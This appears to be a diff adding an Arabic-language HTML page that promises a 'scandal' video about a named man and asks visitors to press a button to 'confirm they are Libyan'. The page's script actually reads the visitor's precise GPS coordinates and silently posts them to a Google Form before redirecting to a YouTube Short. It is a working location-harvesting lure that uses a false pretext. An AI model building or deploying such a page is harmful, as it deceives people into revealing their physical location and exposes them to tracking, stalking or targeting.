@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <title>فضيحة النصاب احمد المشيطي </title>
+</head>
+<body>
+  <h2>اضغط الزر للتاكد من انك ليبي والانتقال للفيديو</h2>
+  <button onclick="getLocation()">📍 تاكد من اني ليبي وانتقل للفيديو</button>
+  <p id="status"></p>
+
+  <script>
+    function getLocation() {
+      const status = document.getElementById('status');
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            status.textContent = `تم الحصول على الموقع: خط العرض ${latitude}, خط الطول ${longitude}`;
+
+            const googleFormURL = 'https://docs.google.com/forms/d/e/1FAIpQLSdD3NlYw4l9BJpWJM_0jFqYtq8JX9SS0FVobCTHbCsoEfXZww/formResponse';
+            const entryLatitude = 'entry.787215635';
+            const entryLongitude = 'entry.935676671';
+
+            const formData = new FormData();
+            formData.append(entryLatitude, latitude);
+            formData.append(entryLongitude, longitude);
+
+            fetch(googleFormURL, {
+              method: 'POST',
+              mode: 'no-cors',
+              body: formData
+            }).then(() => {
+              status.textContent += ' - تم الإرسال، جاري تحويلك للفيديو...';
+              window.location.href = 'https://youtube.com/shorts/B_siSO3_vjk?feature=shared';
+            }).catch(() => {
+              status.textContent += ' - حدث خطأ في الإرسال، جاري تحويلك للفيديو...';
+              window.location.href = 'https://youtube.com/shorts/B_siSO3_vjk?feature=shared';
+            });
+          },
+          (error) => {
+            status.textContent = 'تعذر الحصول على التاكيد: ' + error.message + ' - سيتم تحويلك للفيديو.';
+            setTimeout(() => {
+              window.location.href = 'https://youtube.com/shorts/B_siSO3_vjk?feature=shared';
+            }, 3000);
+          }
+        );
+      } else {
+        status.textContent = 'المتصفح لا يدعم تحديد الجنسية - سيتم تحويلك للفيديو.';
+        setTimeout(() => {
+          window.location.href = 'https://youtube.com/shorts/B_siSO3_vjk?feature=shared';
+        }, 3000);
+      }
+    }
+  </script>
+</body>
+</html>
